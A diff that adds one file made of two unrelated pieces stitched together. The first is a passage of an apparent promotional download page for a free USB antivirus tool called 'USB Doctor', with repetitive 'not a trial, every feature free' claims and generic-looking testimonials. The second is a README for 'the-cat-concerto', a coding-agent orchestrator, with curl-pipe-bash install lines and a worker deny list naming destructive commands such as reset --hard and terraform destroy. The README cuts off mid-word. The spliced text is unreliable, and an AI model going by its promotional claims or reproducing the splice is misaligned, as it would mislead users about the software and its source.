@@ -1,0 +1,182 @@
+ from viruses, particularly those that exploit the autorun.inf file. It offers targeted protection to maintain the integrity of your USB devices.
+</details>
+
+<details>
+<summary>Is USB Doctor free, and are all features included?</summary>
+Yes, USB Doctor is completely free, with all features included. This is not a trial and not a limited version — it is the complete package with every feature included, free of charge.
+</details>
+
+<details>
+<summary>Is this a trial or limited version?</summary>
+This is not a trial and not a limited version — it is the complete package with every feature included, free of charge. Nothing is locked and no upgrade is required.
+</details>
+
+<details>
+<summary>How do I download the latest stable release 2026?</summary>
+To download the latest stable release 2026, visit the official page, locate USB Doctor, and click the download link for the verified Windows installer.
+</details>
+
+<details>
+<summary>Does USB Doctor work on Windows 10 and Windows 11?</summary>
+Yes, USB Doctor is fully compatible with both Windows 10 and Windows 11, ensuring optimal performance on the latest operating systems.
+</details>
+
+<details>
+<summary>Can I use USB Doctor offline?</summary>
+USB Doctor can be used offline, allowing you to protect your USB drives without an internet connection. However, updates will require internet access.
+</details>
+
+<details>
+<summary>What is the fastest way to update USB Doctor?</summary>
+Open the official download page and replace your current build with the latest stable release 2026. Your preferences stay intact when you upgrade to the newest version.
+</details>
+
+## User Testimonials
+<a id="user-testimonials"></a>
+
+**Alice Johnson, IT Specialist, USA** — "USB Doctor made it easy to manage my USB security, and I can use my devices without worrying about infections."
+
+**Liam Smith, Freelance Writer, Canada** — "I trust USB Doctor to keep my files safe while I travel, making it an essential tool for my work."
+
+**Maya Patel, Small Business Owner, India** — "With USB Doctor, I feel secure sharing files with clients. It’s a reliable program that protects my data effectively."
+
+**Javier Garcia, Software Developer, Spain** — "The real-time alerts are a game-changer. I appreciate how USB Doctor keeps me informed about potential threats."
+
+**Chloe Brown, Student, Australia** — "Using USB Doctor is simple, and it keeps my school projects safe from viruses, which is a big relief."
+
+## License Info
+<a id="license-info"></a>
+
+USB Doctor is distributed under a free license. The product includes the full feature
+set and the complete package — every feature is unlocked, with no hidden
+paywall and no locked tools. Always download the official release from the
+official source to ensure authenticity and security.
+
+## Official Links
+<a id="official-links"></a>
+- 📥 **[Official download page](https://softyne.com/usb-doctor)**
+- 🎥 **[Video tutorial](https://softyne.com/usb-doctor/#video-guide)**
+- 📧 **[Support](mailto:support@softyne.com)**
+- 📖 **[Documentation](https://softyne.com/privacy-policy-2/)**
+- 💬 **[Community](https://softyne.com/about-us/)**
+
+---
+**Last updated:** 2026-11-05 03:16:28 UTC
+
+
+---
+
+# the-cat-concerto
+
+Orchestrator prompt + worker contract for coding agents, driven by
+[herdr](https://herdr.dev).
+
+One orchestrator prompt routes work by location: inside your repo it
+works directly; across sibling project repos it spawns one herdr pane
+per repo, starts a worker agent in it, delegates, then reviews the
+result.
+
+## Prerequisites
+
+1. **herdr** — `brew install herdr` or see https://herdr.dev
+   (the installer warns but proceeds without it; delegation needs it)
+
+The herdr skill for your harness is handled during install: run it
+via herdr, install the bundled snapshot, or skip (the command is
+printed at the end).
+
+## Install
+
+One-liner — interactive, no clone needed:
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/Herdanis/the-cat-concerto/main/install.sh | bash
+```
+
+By default this installs the latest release tag. To install from the
+latest commit on `main` instead:
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/Herdanis/the-cat-concerto/main/install.sh | bash -s -- --source commit
+```
+
+You get two questions (arrow keys + space to select, enter to
+confirm, backspace to go back):
+
+1. **Harness** (multi-select): opencode, claude, codex, gemini
+2. **herdr skill**: run `herdr integration install <harness>` now,
+   install the bundled snapshot, or skip
+
+Non-interactive (CI, scripts) — clone and pass flags:
+
+```bash
+git clone --depth 1 https://github.com/Herdanis/the-cat-concerto /tmp/the-cat-concerto
+/tmp/the-cat-concerto/install.sh --harness <harness>
+```
+
+Supported harnesses: `opencode`, `claude` (Claude Code), `codex`,
+`gemini`, `pi`, `omp`. Works with OpenCode V1 and V2 — worker spawn
+flags differ per version, see [docs/harnesses.md](docs/harnesses.md).
+Other herdr-supported agents: same doc.
+
+On OpenCode V2 the install also ships the concerto plugin
+(`concerto_spawn`/`send`/`report`/`collect` tools). The orchestrator
+spawns workers as silent headless sessions instead of herdr panes:
+no pane, no paste, no polling — the plugin wakes the orchestrator
+when a worker finishes, and every cross-session message carries a
+`[concerto:...]` provenance prefix. Watch any worker live with
+`opencode --session <id>`. If the plugin is missing (older OpenCode,
+or your setup doesn't auto-discover the plugins directory), the
+orchestrator falls back to the herdr pane flow automatically.
+
+## Options
+
+| Flag | Values | Default | Meaning |
+|---|---|---|---|
+| `--harness` | opencode, claude, codex, gemini, pi, omp (comma-sep for multiple) | interactive prompt | target harness(es) |
+| `--herdr-skill` | manual, vendor | manual | manual: prints the `herdr integration install` command; vendor: installs the bundled snapshot |
+| `--source` | tag, commit, local | tag for curl installs, local for a checkout | where the prompts come from: latest git tag, latest main commit, or the checkout beside the script (testing) |
+| `--prefix DIR` | any dir | `$HOME` | install root (for testing) |
+| `--force` | — | off | overwrite files that lack concert markers |
+| `CONCERTO_NO_TUI=1` | env | — | numbered prompts instead of arrow-key TUI |
+
+## What gets installed
+
+| Harness | Orchestrator | Worker |
+|---|---|---|
+| opencode | `~/.config/opencode/agents/orchestrator.md` | `~/.config/opencode/agents/concerto-worker.md` + plugin at `~/.config/opencode/plugins/the-cat-concerto/` (V2) |
+| claude | marked block in `~/.claude/CLAUDE.md` | same block |
+| codex | marked block in `~/.codex/AGENTS.md` | same block |
+| gemini | marked block in `~/.gemini/GEMINI.md` | same block |
+| pi | marked block in `~/.pi/agent/AGENTS.md` | same block |
+| omp | marked block in `~/.omp/agent/AGENTS.md` | same block |
+
+Re-running the installer is safe: same version = no-op, newer version =
+in-place upgrade (vendored herdr skill included — it carries a concert
+marker and updates in place), foreign and herdr-managed files are
+refused unless `--force`. With no flags, an already-installed system
+skips the prompts entirely and just updates what's there (pass
+`--harness` to add or change harnesses).
+
+The opencode install writes agent files only — never
+`~/.config/opencode/AGENTS.md`, which OpenCode V2 injects into every
+session including workers. A block left there by an older version is
+stripped on the next run (the file is deleted only if nothing else
+remains).
+
+Plugin discovery assumption: OpenCode V2 auto-discovers
+`~/.config/opencode/plugins/<dir>/`. After installing, verify with
+`opencode plugin list` — `the-cat-concerto` should be listed. If it
+is not, register it explicitly (never hand-edit `opencode.jsonc`):
+
+```bash
+opencode plugin add ~/.config/opencode/plugins/the-cat-concerto
+```
+
+## Commits and pushes
+
+The installed `concerto-worker` agent hard-denies the actions that
+change real state: push, reset --hard, terraform apply/destroy,
+kubectl apply/create/delete/scale, helm upgrade, docker stack deploy,
+gh repo create, gh pr merge, DB migrations — plus the question and
+subagent tools. No instruction unlocks thos
